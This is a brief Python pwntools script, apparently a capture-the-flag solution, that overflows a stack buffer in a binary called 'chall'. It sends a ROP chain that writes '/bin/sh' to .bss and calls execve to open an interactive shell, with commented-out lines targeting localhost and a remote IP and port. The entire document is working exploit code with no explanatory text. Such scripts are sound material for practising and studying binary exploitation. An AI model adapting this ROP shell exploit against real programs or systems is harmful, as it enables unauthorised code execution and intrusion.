from pwn import *

#context.log_level = 'debug'
elf = ELF('./chall')
p = process('./chall')
#p = remote('localhost', 7777 )
#p = remote('13.231.207.73', 9010 )

bss = 0x604240

payload = b''
payload += b'A' * 0x100
payload += b'B' * 0x08
#payload += p64(0x4002a0) #ret
payload += p64(0x400121) #pop rax; ret
payload += b'/bin/sh\0'
payload += p64(0x40141c) #pop rdi; ret
payload += p64(bss)
payload += p64(0x400704) #mov [rdi],rax; ret
payload += p64(0x400121) #pop rax; ret
payload += p64(59)
payload += p64(0x4023f5) #pop rdx; ret
payload += p64(0)
payload += p64(0x40141a) #pop rsi; pop r15; ret
payload += p64(0)
payload += p64(0)
payload += p64(0x4024dd) #syscall; ret

write( 'payload', payload )
p.recvuntil("What's your team name?\n")
p.sendline( payload )
p.interactive()
